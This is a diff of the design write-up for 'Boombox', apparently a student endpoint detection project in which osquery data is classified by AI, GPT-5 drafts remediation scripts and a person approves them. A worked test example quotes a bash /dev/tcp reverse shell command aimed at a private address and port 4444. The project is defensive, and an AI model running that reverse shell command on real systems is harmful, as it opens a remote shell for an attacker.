@@ -8,8 +8,8 @@ a server. An AI classifier decides whether anything looks malicious, a second AI
 writes a script to fix it, a person reviews and approves the script on a web dashboard, and
 the client then runs it.
 
-This document tells the story of the project: what we built, how and why, what went wrong
-and how we fixed it, and how to set it up yourself.
+This document covers what we built, how and why, what went wrong and how we fixed it, and
+how to set it up yourself.
 
 **Contents**
 1. [What we built](#1-what-we-built)
@@ -18,61 +18,160 @@ and how we fixed it, and how to set it up yourself.
 4. [Design decisions](#4-design-decisions)
 5. [Problems we hit and how we solved them](#5-problems-we-hit-and-how-we-solved-them)
 6. [Setup and usage](#6-setup-and-usage)
-7. [Known limitations](#7-known-limitations)
+7. [Known limitations and future work](#7-known-limitations-and-future-work)
 8. [External tools and resources](#8-external-tools-and-resources)
 
 ---
 
 ## 1. What we built
 
-```
- Linux / Windows machine                    Server (Docker Compose)
- ┌────────────────────┐   poll + results   ┌──────────────────────────────┐
- │ Boombox client     │ ─────────────────▶ │ Client API (Python, :8080)   │
- │  runs osquery      │                    │  ├─ filter our own traffic   │
- │  runs approved     │ ◀───────────────── │  ├─ Jev: is this row bad?    │
- │  fix scripts       │  approved scripts  │  ├─ OpenAI: write a fix      │
- └────────────────────┘                    │  └─ check the fix            │
-                                           │             │                │
-                                           │       PostgreSQL (:5432)     │
-                                           │             │                │
-                                           │ Dashboard API (Go, :8000)    │
-                                           │ Dashboard website (Vue, :80) │
-                                           └──────────────────────────────┘
-                                                         ▲
-                                                 a person reviews,
-                                               edits, approves or denies
+### Architecture
+
+```mermaid
+flowchart LR
+    subgraph Endpoints["Endpoints (VMs)"]
+        LC["Linux client<br/>Go + osquery<br/>systemd service"]
+        WC["Windows client<br/>Go + osquery<br/>NSSM service"]
+    end
+
+    subgraph Server["Server VM: Docker Compose"]
+        CA["Client API<br/>Python / FastAPI<br/>:8080"]
+        DB[("PostgreSQL<br/>:5432")]
+        DA["Dashboard API<br/>Go<br/>:8000"]
+        WEB["Dashboard website<br/>Vue, served by nginx<br/>:80"]
+    end
+
+    JEV["TypeSafe Jev<br/>decision model"]
+    OAI["OpenAI GPT-5<br/>remediation model"]
+    ADMIN(["Reviewer<br/>(browser)"])
+
+    LC & WC -- "register, poll, send results<br/>(HTTP over Tailscale)" --> CA
+    CA -- "is each row benign,<br/>suspicious or malicious?" --> JEV
+    CA -- "write one fix script" --> OAI
+    CA <--> DB
+    DA <--> DB
+    WEB -- "/api, /health" --> DA
+    ADMIN --> WEB
 ```
 
-The pieces, and where they live in the repository:
+The two APIs never call each other. They share the database: the client API writes fix
+scripts as `pending_review`, the dashboard API marks them `approved` or `denied`, and the
+client API hands approved ones to the client.
 
 | Part | What it does | Folder |
 |---|---|---|
-| Linux client | Go program; runs as a systemd service | `client/linux` |
-| Windows client | Go program (earlier Python version kept); runs as a Windows service | `client/windows-client` |
+| Linux client | Go program that runs osquery queries and approved bash scripts; systemd service | `client/linux` |
+| Windows client | Go program (an earlier Python version is kept) that runs osquery queries and approved PowerShell scripts; Windows service via NSSM | `client/windows-client` |
 | Client API | Python (FastAPI). Registers clients, hands out queries and approved scripts, receives results, runs the AI pipeline | `server/client-api` |
 | Database | PostgreSQL tables shared by both APIs | `server/database` |
-| Dashboard API | Go. Lists fix scripts and clients, approve/deny/edit, per-client queries | `server/dashboard-api` |
-| Dashboard website | Vue. Review queue, backlog, analytics, clients | `dashboard/frontend/boombox` |
-| Tests | One `curl` script per step of the flow, plus a database watcher and a cost report | `tests/` |
-| Live demo | A victim machine with a reverse shell and an attacker machine, in Docker | `demo/` |
+| Dashboard API | Go. Lists fix scripts and clients; approve, deny, edit; per-client queries | `server/dashboard-api` |
+| Dashboard website | Vue. Review queue, backlog, analytics dashboard, clients page | `dashboard/` |
+| Live demo | A victim container with a reverse shell and an attacker container | `demo/` |
 
-**The flow, step by step**
+### One attack, start to finish
 
-1. A client registers once (`POST /api/v1/clients` with its hostname, OS and OS version) and
-   receives a `client_id`. It sends that id as the `X-Client-Id` header on every request.
-2. The client polls `GET /api/v1/poll/queries` and gets osquery SQL to run: a default list
-   for its OS plus any queries the dashboard assigned to that client.
-3. It runs them with osquery and posts the rows to `POST /api/v1/results`.
-4. The server drops rows that are our own normal traffic, then asks **TypeSafe Jev** about
-   every remaining row: benign, suspicious, or malicious.
-5. If anything is flagged, the findings are grouped into one attack and **OpenAI** writes a
-   single bash (Linux) or PowerShell (Windows) script to fix it. The script is checked
-   automatically and saved as `pending_review`.
-6. A person opens the dashboard, reads the explanation and the script, can edit it, and
-   approves or denies it.
-7. The client polls `GET /api/v1/poll/remediations`, receives each approved script once,
-   and runs it.
+```mermaid
+sequenceDiagram
+    autonumber
+    participant C as Client (osquery)
+    participant A as Client API
+    participant J as Jev
+    participant O as OpenAI
+    participant D as Database
+    participant W as Dashboard
+    participant R as Reviewer
+
+    C->>A: POST /api/v1/clients (hostname, os, os_version)
+    A->>D: save client
+    A-->>C: client_id (sent as X-Client-Id from now on)
+
+    loop every polling interval (10 s by default)
+        C->>A: GET /api/v1/poll/queries
+        A-->>C: default queries for its OS + its own enabled queries
+        C->>C: run each query with osquery
+        C->>A: POST /api/v1/results (rows)
+        A->>A: drop our own traffic (scope.py)
+        A->>J: classify rows (25 per request)
+        J-->>A: benign / suspicious / malicious + confidence
+        A-->>C: verdict and findings
+        opt something flagged, and this attack has no open fix yet
+            A->>D: save the event
+            A-)O: write one fix for the whole attack (in the background)
+            O-->>A: title, script, explanation
+            A->>A: automatic checks (one retry if they fail)
+            A->>D: save fix as pending_review
+        end
+        C->>A: GET /api/v1/poll/remediations
+        A->>D: approved fixes for this client, marked executed
+        A-->>C: scripts (each one is sent only once)
+        C->>C: run each script (bash or PowerShell)
+    end
+
+    R->>W: open Review, read explanation and script
+    W->>D: (via dashboard API) edit, approve or deny
+```
+
+### Inside the AI pipeline
+
+```mermaid
+flowchart TD
+    IN["POST /api/v1/results<br/>rows from every query"] --> SCOPE{"Our own traffic?<br/>Boombox client, osquery,<br/>server address, pid -1,<br/>Tailscale"}
+    SCOPE -- yes --> DROP["ignored"]
+    SCOPE -- no --> CTX["add context to each row:<br/>parent process, its connections,<br/>the process behind a connection"]
+    CTX --> JEV["Jev: one choice per row<br/>benign / suspicious / malicious"]
+    JEV --> CONF{"flagged with<br/>confidence ≥ 0.5?"}
+    CONF -- no --> OK["nothing to do"]
+    CONF -- yes --> FAM["group findings by process family<br/>(follow flagged parents up,<br/>stop at an unflagged parent)"]
+    FAM --> OPEN{"family already has a fix<br/>pending, approved,<br/>or being written?"}
+    OPEN -- yes --> SKIP["skip: one fix per attack"]
+    OPEN -- no --> LIST["attack processes =<br/>flagged processes + their children<br/>(never their parents)"]
+    LIST --> GPT["OpenAI GPT-5, low reasoning:<br/>shared rules + Linux or Windows tips"]
+    GPT --> CHECK{"automatic checks<br/>bash: bash -n, ShellCheck, read-only vars<br/>PowerShell: known mistakes"}
+    CHECK -- pass --> SAVE[("save as pending_review")]
+    CHECK -- fail --> RETRY["send the errors back<br/>for one corrected try"]
+    RETRY --> CHECK2{"checks again"}
+    CHECK2 -- pass --> SAVE
+    CHECK2 -- fail --> WARN["save, with a warning<br/>in the explanation"] --> SAVE
+```
+
+### A fix script's life
+
+```mermaid
+stateDiagram-v2
+    [*] --> pending_review: OpenAI writes it, checks run
+    pending_review --> pending_review: reviewer edits the script
+    pending_review --> approved: reviewer approves
+    pending_review --> denied: reviewer denies
+    approved --> executed: client polls, receives it once
+    denied --> [*]
+    executed --> [*]
+```
+
+While a fix is `pending_review` or `approved`, the same attack doesn't get another one. Once
+it's denied or executed, anything still flagged gets a new fix on the next poll.
+
+### Infrastructure
+
+```mermaid
+flowchart LR
+    subgraph Proxmox["Proxmox host (us-heritage-1)"]
+        S["CYBER-344-Server<br/>Linux VM, CPU type 'host'<br/>Docker Compose: client API,<br/>dashboard API, website, PostgreSQL"]
+        L["cyber-344<br/>Linux client VM"]
+        W["DESKTOP-S3G51BE<br/>Windows client VM"]
+    end
+    T(("Tailscale<br/>network"))
+    TEAM(["Team laptops"])
+    L -- ":8080" --> S
+    W -- ":8080" --> S
+    TEAM -- ":80 dashboard" --> S
+    S --- T
+    L --- T
+    W --- T
+    TEAM --- T
+```
+
+Each machine is a VM on a small Proxmox server, and the team reaches them over Tailscale.
+The clients only make outgoing requests to the server, so they need no open ports.
 
 ---
 
@@ -80,12 +179,12 @@ The pieces, and where they live in the repository:
 
 | Person | Role | Main work |
 |---|---|---|
-| Andrew Sabolsky | Client API, AI pipeline, project lead | Repository structure and docs, client API, Jev and OpenAI pipeline, grouping and filtering, self-checks, cost tracking, Docker Compose and nginx setup, tests, live demo |
+| Andrew Sabolsky | Client API, and AI pipeline | Repository structure and docs, client API, Jev and OpenAI pipeline, grouping and filtering, automatic script checks, Docker Compose and nginx setup, live demo |
 | Kade Onines | Linux client | Go client with registration, query and remediation loops, systemd service, logging; first task list |
 | Mateo Vallejo | Windows client | Python client, then a faster Go client with retries and backoff; NSSM service and install scripts |
-| Aiden McEwan | Database | PostgreSQL schema and database functions; first remediations API |
+| Aidan McEwan | Database | PostgreSQL schema and database functions; first remediations API |
 | Xander Whitby | Dashboard | Go dashboard API; Vue website with review queue, backlog, analytics, clients page, script editing |
-| Ethan | Infrastructure | Proxmox VMs for the server and both clients, team network access, Docker restart policies, VM CPU fix |
+| Ethan Simon | Infrastructure | Proxmox VMs for the server and both clients, team network access, Docker restart policies, VM CPU fix |
 
 A more detailed breakdown is in [docs/README.md](README.md#who-did-what).
 
@@ -99,22 +198,21 @@ repository with a folder for each part, and split it up: Linux client, Windows c
 models and API, database, dashboard, and infrastructure.
 
 **2. Learn osquery and build the first client loop (October).** Kade built the first osquery
-execution loop in Go, which became the Linux client.
+loop in Go, which became the Linux client.
 
 **3. Build the parts in parallel (November 10–19).**
-- Aiden designed the PostgreSQL schema and a first remediations API.
-- Xander built the dashboard: first a Go API with the same routes, then the Vue website.
-- Andrew built the client API and the AI pipeline. A larger first version (RabbitMQ queue,
-  heuristic fallbacks) was cut down to a simple proof of concept: one FastAPI app, Jev for
-  decisions, OpenAI for fixes, no fallbacks.
-- Kade and Mateo built the client loops against the API as it was then.
+- Aidan designed the PostgreSQL schema and a first remediations API.
+- Xander built the dashboard: first a Go API, then the Vue website.
+- Andrew built the client API and the AI pipeline. A larger first version
+  (a message queue, heuristic fallbacks) was cut down to a simple proof of concept: one
+  FastAPI app, Jev for decisions, OpenAI for fixes, no fallbacks.
+- Kade and Mateo built the client loops against the API.
 
 **4. Merge everything into one system (November 19–20).** The parts had been built
-separately, so they didn't fit together yet: two APIs on the same port, two ways of
-identifying clients, a mock where the real remediation service should be. We picked one
-folder layout (`server/client-api`, `server/dashboard-api`, `server/database`), moved
-Aiden's database code into the client API, ran Xander's Go API side by side, and put
-everything in one `compose.yaml`. Clients now register and use a database-issued UUID.
+separately and didn't fit together yet (see section 5). We picked one folder layout
+(`server/client-api`, `server/dashboard-api`, `server/database`), moved Aidan's database
+code into the client API, ran Xander's Go API side by side with it, and put everything in
+one `compose.yaml`. Clients now register and use a database-issued UUID.
 
 **5. Deploy to the team's servers (November 20–23).** Ethan set up the Proxmox VMs. We moved
 the dashboard website to port 80 behind nginx, fixed a VM CPU setting that stopped the
@@ -124,11 +222,11 @@ clients went live against the real server.
 **6. Test with a live attack and improve the AI (November 21–23).** We built a demo: a victim
 container with a real (harmless) reverse shell, and an attacker container. Running it again
 and again exposed problems: repeat fixes, scripts that half-worked, false alarms, Windows
-scripts that would have closed the user's desktop. We fixed them one at a time (see
-section 5). By the end, the first fix closed the reverse shell in 3 out of 3 test runs.
+scripts that would have closed the user's desktop. We fixed them one at a time (section 5).
+By the end, the first fix closed the reverse shell in 3 out of 3 test runs.
 
-**7. Clean up and document (November 23).** We removed the experiment folders, moved the
-demo into `demo/`, and wrote this document.
+**7. Present and document (November 23).** We presented Boombox in class with the live
+demo, then cleaned up the repository and wrote this document.
 
 ---
 
@@ -136,24 +234,26 @@ demo into `demo/`, and wrote this document.
 
 | Decision | Why |
 |---|---|
-| **osquery for data collection** | It works on Linux and Windows with the same SQL-like queries (processes, network connections, cron jobs, scheduled tasks, startup programs), so both clients can share one server-side list of queries. |
-| **Clients poll the server** (instead of the server pushing to them) | Polling works through NAT and firewalls, needs no open ports on the clients, and is simple to build. The cost is a delay of up to one polling interval. |
-| **Queries are chosen by the server** | New queries can be added in one place (`server/client-api/ingest/queries.py`, or per client from the dashboard) without updating any client. |
-| **Two AI models: a cheap classifier, then an LLM** | Jev checks every row of every poll, so it has to be fast and cheap (about 0.3 s and a fraction of a cent per call). OpenAI only runs when something is flagged, about once per attack. |
-| **Jev for decisions** | Jev returns a calibrated label and confidence instead of free text, which is what a yes/no decision needs. Asking it one question per row tells us exactly which rows are bad. |
-| **Context added to each row** | A row on its own (`bash -i`) says little. Adding the parent process and network connections (`started by a while true … /dev/tcp loop, connected to port 4444`) lets Jev judge it properly. |
-| **A person approves every fix** | AI-written scripts run as root or SYSTEM. A mistake could take down a machine, so nothing runs without review. The reviewer can also edit the script. |
-| **One fix per attack** | One attack shows up as several rows (a loop, its shell, the shell's connection, child processes) on every poll. Without grouping, each poll created a new fix. Findings are grouped by **process family**: follow each flagged process's flagged parents to the top of the attack. |
-| **The attack list never includes parents that weren't flagged** | The program that launched an attack (for example `explorer.exe` or `sshd`) must never be killed. Only the flagged processes and their children are targeted. |
-| **Fix scripts are sent once** | A script is marked executed as it's handed to the client. This avoids running the same fix repeatedly and needs no extra "report result" endpoint. If the attack is still there on the next poll, a new fix is written. |
-| **Filter our own traffic in code, not in the prompt** | The Boombox client, osquery, closed connections and Tailscale are removed before Jev sees anything. Code is predictable; a prompt hint wasn't. |
+| **osquery for data collection** | It works on Linux and Windows with the same SQL-like queries (processes, network connections, cron jobs, scheduled tasks, startup programs), so both clients share one server-side list of queries. |
+| **Clients poll the server** (instead of the server pushing to them) | Polling needs no open ports on the clients, works through NAT and firewalls, and is simple to build. The cost is a delay of up to one polling interval (10 seconds by default). |
+| **Lightweight clients** | The clients only run queries, send rows, and run approved scripts. All the decisions happen on the server, so the clients stay small and the logic lives in one place. |
+| **Clients run as root / SYSTEM** | osquery needs it to see every process and connection, and fixes need it to stop processes and remove persistence. That is also why every fix needs a person's approval. |
+| **Queries are chosen by the server** | New queries are added in one place (`server/client-api/ingest/queries.py`, or per client from the dashboard) without updating any client. |
+| **Two AI models: a fast classifier, then an LLM** | Jev checks every row of every poll, so it has to be fast and cheap. In our test today it answered in 0.1–0.3 seconds per request for a small fraction of a cent. OpenAI only runs when something is flagged, about once per attack. |
+| **Jev for decisions** | Jev returns a label and a confidence instead of free text, which is what a yes/no decision needs. Asking for one choice per row tells us exactly which rows are bad. |
+| **Context added to each row** | A row on its own (`bash -i`) says little. Adding its parent process and its network connections (`started by bash -c … /dev/tcp/…, connected to port 4444`) lets Jev judge it properly. |
+| **A person approves every fix** | AI-written scripts run as root or SYSTEM. A mistake could take down a machine, so nothing runs without review. The reviewer can also edit the script first. |
+| **One fix per attack** | One attack shows up as several rows (a loop, its shell, the shell's connection, child processes) on every poll. Findings are grouped by **process family**: follow each flagged process's flagged parents to the top of the attack. A family with an open fix doesn't get another. |
+| **Never target unflagged parents** | The program that launched an attack (for example `explorer.exe` or `sshd`) must never be killed. Only the flagged processes and their children are targeted. |
+| **Fix scripts are sent once** | A script is marked `executed` as it's handed to the client. This avoids running the same fix repeatedly and needs no "report result" endpoint. If the attack is still there, the next poll gets a new fix. |
+| **Filter our own traffic in code, not in the prompt** | The Boombox client, osquery, connections to the server, closed connections and Tailscale are removed before Jev sees anything. Code is predictable; a prompt hint wasn't. |
 | **Different tips for Linux and Windows** | bash and PowerShell have different pitfalls. Each request only gets the tips for its own OS, which keeps the prompt short. |
 | **Automatic checks before review** | `bash -n`, ShellCheck, and our own checks catch common script mistakes. If any fail, the errors go back to OpenAI for one corrected try; anything left is shown to the reviewer as a warning. |
-| **Low reasoning effort for OpenAI** | We tested high, medium and low. High took 100 seconds and 11¢ per fix and wrote over-complicated scripts; low took about 12 seconds and 1.5¢ and worked just as well. |
-| **The client id is the only authentication** | This is a proof of concept. Real authentication can be added in one place (`server/client-api/auth.py`) later. |
+| **Low reasoning effort for OpenAI** | We tried high, medium and low. High took about 100 seconds and 11¢ per fix and wrote over-complicated scripts. Low takes 15–20 seconds and 2–3¢ and works just as well. |
+| **The client id is the only authentication** | This is a proof of concept. Real authentication can be added in one place (`server/client-api/auth.py`). |
 | **Two APIs, one database** | The client API (Python) and the dashboard API (Go) never call each other; they share PostgreSQL. Each team member could work on their part independently. |
-| **Everything in Docker Compose** | One command starts the database, both APIs and the website, the same way on a laptop and on the server. |
-| **The dashboard website is built and served by nginx** | The first setup ran Vite's development server, which broke whenever the Go container restarted. A built site behind nginx is simpler and keeps working. |
+| **Everything in Docker Compose** | One command starts the database, both APIs and the website, the same way on a laptop and on the server, and every service restarts automatically. |
+| **The website is built and served by nginx** | A built site in its own container is simple and keeps working when the Go API restarts (see section 5). |
 | **uv for Python packages** | `uv.lock` pins exact package versions, so everyone and the server get the same build. |
 
 ---
@@ -163,70 +263,70 @@ demo into `demo/`, and wrote this document.
 **Parts built separately didn't fit together.**
 The client API, the database API and the dashboard API were built in parallel against
 different assumptions. Two APIs used port 8000, clients identified themselves in two ways,
-and two copies of the remediations API existed. *Fix:* one folder layout, Aiden's database
+and two copies of the remediations API existed. *Fix:* one folder layout, Aidan's database
 code moved into the client API, Xander's Go API kept for the dashboard, the client API moved
 to port 8080, and clients register once to get a database UUID.
 
+**The API changed while the clients were being built.**
+As the server was reorganized, endpoints moved and clients started registering. *Fix:* the
+request formats are written down in `server/client-api/README.md`, and every endpoint can be
+tried in the browser at `http://<server>:8080/docs`.
+
 **The dashboard website stopped working when the Go API restarted.**
-The website container shared the Go container's network so its development proxy could reach
-`localhost:8000`. When the Go container restarted, the website was left on a network that no
-longer existed, and port 80 went dead. *Fix:* build the website and serve it from its own
-nginx container, which forwards `/api` to the Go API by name.
+The website first ran Vite's development server inside the Go container's network so it
+could reach `localhost:8000`. When the Go container restarted, the website was left on a
+network that no longer existed, and port 80 went dead. *Fix:* build the website and serve it
+from its own nginx container, which forwards `/api` to the Go API by name.
 
 **The website wouldn't build on the server ("Illegal instruction").**
 Vite 8 builds with a native program that needs modern CPU instructions (AVX2). The Proxmox VM
-used the default virtual CPU (`QEMU Virtual CPU version 2.5+`), which hides them. *Fix:* in
-Proxmox, set the VM's processor type to `host` and fully restart the VM.
+used the default virtual CPU, which hides them. *Fix:* in Proxmox, set the VM's processor
+type to `host` and fully restart the VM.
 
 **A new fix script on every poll.**
 Clients send the same results every poll, so the same reverse shell got a new fix every few
-seconds. A first fix (skip rows that already have an open fix) wasn't enough: PIDs change,
-and Jev flags different parts of the same attack on different polls. *Fix:* group findings by
-process family, skip any family that already has an open fix, and also remember fixes that are
-still being written (OpenAI takes 10–20 seconds).
+seconds. Skipping rows that already had a fix wasn't enough: PIDs change, and Jev flags
+different parts of the same attack on different polls. *Fix:* group findings by process
+family, skip any family that already has an open fix, and also remember fixes that are still
+being written. In today's test, sending the same results again logged "every finding already
+has an open fix script, not making another".
 
 **AI fix scripts that only half worked.** Running the demo repeatedly showed several mistakes:
 - Killing a parent process, then checking "is the child's parent still X?". Linux moves
   orphaned children under PID 1, so the check failed and the child was never killed.
 - Assigning to `PPID` or `UID`, which are read-only in bash, so the script stopped on the spot.
 - Sending only SIGTERM. An interactive `bash -i` ignores SIGTERM, so the reverse shell survived.
-- A final "is it gone?" check using `grep` or `awk` on `ps` output, which found its own search
-  command.
-- The fix was written from a snapshot taken before the shell connected. By the time a person
-  approved it, new processes existed that weren't in the list.
+- A final "is it gone?" check using `grep` on `ps` output, which found its own search command.
+- The fix was written from a snapshot taken before the shell connected, so by the time a
+  person approved it, new processes existed that weren't in the list.
 
-*Fix:* give OpenAI the exact list of attack processes, tell it to kill every **current** child
-at run time (`pkill -9 -P`), to escalate to `kill -9`, and to use `pgrep -f` (which never
+*Fix:* give OpenAI the exact list of attack processes, tell it to kill every **current**
+child at run time (`pkill -P`), to escalate to `kill -9`, and to use `pgrep -f` (which never
 matches itself). The automatic checks now catch read-only variable assignments. After these
 changes, the first fix closed the shell in 3 of 3 runs.
 
 **False alarms.** Jev flagged the Boombox client's own connection to the server, closed
-sockets with no process (`pid -1`), Tailscale, and even the Boombox client and osquery
-themselves, including the osquery service on Windows. *Fix:* `triage/scope.py` removes these
-before Jev sees them, matching by process name and by the program's file name in the path or
-command line. Some normal programs (VS Code, Copilot, a Windows Update task) are still flagged
-as "suspicious" around 50% confidence; a person denies those on the dashboard.
+sockets with no process (`pid -1`), Tailscale, and the Boombox client and osquery themselves,
+including the osquery service on Windows. *Fix:* `triage/scope.py` removes these before Jev
+sees them, matching by process name and by the program's file name in the path or command
+line. Some normal programs (VS Code, Copilot, a Windows Update task) are still sometimes
+flagged as "suspicious" around 50% confidence; a person denies those on the dashboard.
 
-**Windows fixes that would have closed the desktop.** In a test with fake Windows data, the
-first fix killed `explorer.exe`, because the process-family code had walked up from the
+**Windows fixes that would have closed the desktop.** In a test with made-up Windows data,
+the first fix killed `explorer.exe`, because the process-family code had walked up from the
 malware to the program that launched it. The script also used `$Pid` (read-only in
 PowerShell), doubled backslashes inside single quotes, and `"$name:"` (a PowerShell syntax
-error). *Fix:* the family walk stops at parents that weren't flagged; the prompt gets Windows
-tips; the automatic checks look for these PowerShell mistakes.
+error). *Fix:* the family walk stops at parents that weren't flagged, the prompt gets
+Windows tips, and the automatic checks look for these PowerShell mistakes.
 
 **More AI thinking made things worse.** "High" reasoning wrote 100-line scripts that read
-`/proc` by hand and still failed. *Fix:* reasoning set to low, plus a "keep it short and simple,
-use `pgrep`/`pkill`" rule.
-
-**The API changed while the clients were being built.** As the server was reorganized,
-endpoints moved (for example `/poll` became `/api/v1/poll/queries`, and clients started
-registering). *Fix:* the request formats are documented in `server/client-api/README.md`, with
-a `curl` script for every step in `tests/`.
+`/proc` by hand and still failed. *Fix:* reasoning set to low, plus a "keep it short and
+simple, use `pgrep`/`pkill`" rule.
 
 **Smaller issues:** a container left over from an older compose file held port 8000 (fixed
 with `docker compose up --remove-orphans`); iCloud created duplicate files like
-`schema 2.sql` in the repository folder (deleted after checking they were identical); and API
-keys belong only in the git-ignored `.env`, never in `.env.example`.
+`schema 2.sql` in the repository folder (deleted after checking they were identical); and
+API keys belong only in the git-ignored `.env`, never in `.env.example`.
 
 ---
 
@@ -269,7 +369,6 @@ The database starts empty. To empty it again: `docker compose down -v`, then
 | `OPENAI_MODEL` | `gpt-5` | OpenAI model |
 | `OPENAI_REASONING_EFFORT` | `low` | How hard OpenAI thinks: `minimal`, `low`, `medium`, `high` |
 | `BOOMBOX_SERVER_ADDRESSES` | (none) | Other addresses clients use to reach the server, so their connections aren't flagged |
-| `JEV_PRICE_*`, `OPENAI_PRICE_*` | estimates | Prices per million tokens, used for cost tracking |
 
 ### Install the Linux client (Kade's)
 
@@ -279,10 +378,11 @@ go build -o boombox-client .
 cp .env.example .env      # set API_HOST to http://<server>:8080 and OS_VERSION
 ```
 
-To run it as a service, use `boombox-client.service`. Two things to know: the unit file
-expects the binary at `/user/sbin/boombox-client` (note "user", not "usr"; copy it there or
-change the path), and the client reads `.env` from its working directory, which is `/` for
-systemd services (put `.env` there, or add a `WorkingDirectory=` line to the unit). Then:
+`QUERY_INTERVAL` in `.env` sets how often it polls (10 seconds). To run it as a service, use
+`boombox-client.service`. Two things to know: the unit file expects the program at
+`/user/sbin/boombox-client` (note "user", not "usr"; copy it there or change the path), and
+the client reads `.env` from its working directory, which is `/` for systemd services (put
+`.env` there, or add a `WorkingDirectory=` line to the unit). Then:
 
 ```bash
 sudo cp boombox-client.service /etc/systemd/system/
@@ -299,32 +399,43 @@ PowerShell: run `install-dependencies.ps1` (Go and NSSM), build with
 
 ### Use it
 
-1. Open the dashboard (http://<server>). Clients appear under **Clients** once they register.
-2. When something suspicious happens on a client, a fix appears under **Review** within about
-   a minute: severity, title, the AI's explanation, and the script.
+1. Open the dashboard (`http://<server>`). Clients appear under **Clients** once they register.
+2. When something suspicious happens on a client, a fix appears under **Review** within
+   about a minute (in our test, about 20 seconds): severity, title, the AI's explanation,
+   and the script.
 3. Read it, edit it if needed (**Modify**), then **Approve & deploy** or **Deny**.
 4. The client picks up approved fixes on its next poll and runs them.
 
 To collect something new on every machine of an OS, add a query to
-`server/client-api/ingest/queries.py` and run `docker compose up -d --build client-api`. To give
-one client an extra query, use the dashboard API (`POST /api/v1/client-queries`, see
-`tests/09-add-query.sh`).
+`server/client-api/ingest/queries.py` and run `docker compose up -d --build client-api`. To
+give one client an extra query, use the dashboard API (`POST /api/v1/client-queries` with
+`"enabled": true`, see `server/dashboard-api/README.md`).
 
-### Test it without real clients
+### Try it without real clients
 
-The `tests/` folder has a `curl` script for each step. See `tests/README.md`. For example:
+Open http://localhost:8080/docs and use "Try it out" on each endpoint, or with `curl`:
 
 ```bash
-cd tests
-./01-register.sh linux                     # prints a client_id
-export CLIENT_ID=<that client_id>
-./02-poll-queries.sh                       # queries to run
-./04-results-bad.sh                        # a reverse shell, a miner and a bad cron job
-./05-list-remediations.sh                  # about a minute later: a pending fix
-./06-approve.sh <id>
-./08-poll-remediations.sh                  # the client receives the fix
-./11-costs.sh                              # time, tokens and estimated cost of AI calls
+# Register, and save the client_id it prints
+curl -s -X POST localhost:8080/api/v1/clients -H 'Content-Type: application/json' \
+  -d '{"hostname": "test-box", "os": "linux", "os_version": "Ubuntu 24.04 LTS"}'
+
+# The queries a client would run
+curl -s localhost:8080/api/v1/poll/queries -H "X-Client-Id: <client_id>"
+
+# Send results (format in server/client-api/README.md); a bad row gets a fix shortly after
+curl -s -X POST localhost:8080/api/v1/results -H "X-Client-Id: <client_id>" \
+  -H 'Content-Type: application/json' -d @results.json
+
+# Approve the fix on the dashboard, then receive it as the client would (only once)
+curl -s localhost:8080/api/v1/poll/remediations -H "X-Client-Id: <client_id>"
 ```
+
+We ran exactly this flow on November 23 with a made-up reverse shell
+(`bash -c bash -i >& /dev/tcp/10.0.0.66/4444 0>&1` and its child `bash -i`): Jev flagged the
+shell, its child and its connection as malicious; GPT-5 wrote a "kill the reverse shell"
+script in about 19 seconds; it passed the automatic checks; after approval the client
+received it once, and a second poll returned an empty list.
 
 ### Run the live demo
 
@@ -338,27 +449,40 @@ attacker's connection close.
 - **Client API (port 8080):** `POST /api/v1/clients`, `GET /api/v1/poll/queries`,
   `POST /api/v1/results`, `GET /api/v1/poll/remediations`. Full formats in
   `server/client-api/README.md`, and live at http://localhost:8080/docs.
-- **Dashboard API (port 8000):** `GET /api/v1/endpoints`, `GET|POST /api/v1/remediations`,
-  `GET /api/v1/remediations/{id}`, `POST /api/v1/remediations/{id}/approve|deny`,
-  `PUT /api/v1/remediations/{id}/script`, and per-client queries under
-  `/api/v1/client-queries`. See `server/dashboard-api/README.md`.
+- **Dashboard API (port 8000):** `GET /health`, `GET /api/v1/endpoints`,
+  `GET|POST /api/v1/remediations`, `GET /api/v1/remediations/{id}`,
+  `POST /api/v1/remediations/{id}/approve|deny`, `PUT /api/v1/remediations/{id}/script`,
+  `GET /api/v1/clients/{client_id}/queries`, `POST /api/v1/client-queries`,
+  `PUT /api/v1/client-queries/{id}`. See `server/dashboard-api/README.md`.
 - **Database tables:** `clients`, `events`, `remediations`, `client_queries`. See
   `server/database/README.md`.
 
 ---
 
-## 7. Known limitations
+## 7. Known limitations and future work
 
+**Limitations**
 - **Authentication is just the client id.** Anyone who knows a client id can act as that client.
+- **The Linux client registers every time it starts**, so a restart shows up as a new client
+  on the dashboard.
 - **Fixes are sent once with no result report.** If a client crashes before running a fix, it
   isn't sent again (a still-present attack gets a new fix on the next poll).
 - **Some normal programs are still flagged as "suspicious"** (around 50% confidence); a person
   has to deny them.
 - **PowerShell fixes are only pattern-checked.** There is no PowerShell in the server container,
   so syntax errors are only caught if they match a known mistake.
-- **Connections to other Tailscale machines are ignored**, which means an attacker on the tailnet
+- **Connections to other Tailscale machines are ignored**, so an attacker on the tailnet
   wouldn't be flagged by connection alone (the processes still would be).
 - **Dashboard API:** creating a per-client query without `"enabled": true` saves it as disabled.
+
+**Future work** (from our presentation)
+- Network segmentation between the clients and the server.
+- More clients and more operating systems.
+- A pipeline for denied fixes: send the reviewer's reason back to the AI for a better one.
+- Alerts to Discord or PagerDuty when a fix is waiting for review.
+- A local decision model instead of a hosted one.
+
+**Why "Boombox"?** EDR → EDM: event-driven microservices, and electronic dance music.
 
 ---
 
@@ -403,3 +527,6 @@ attacker's connection close.
 **Development assistance**
 - Claude Code (Anthropic), an AI coding assistant, helped write and test code and
   documentation: https://www.anthropic.com/claude-code
+
+**Diagrams**
+- Mermaid (the diagrams in this document): https://mermaid.js.org/
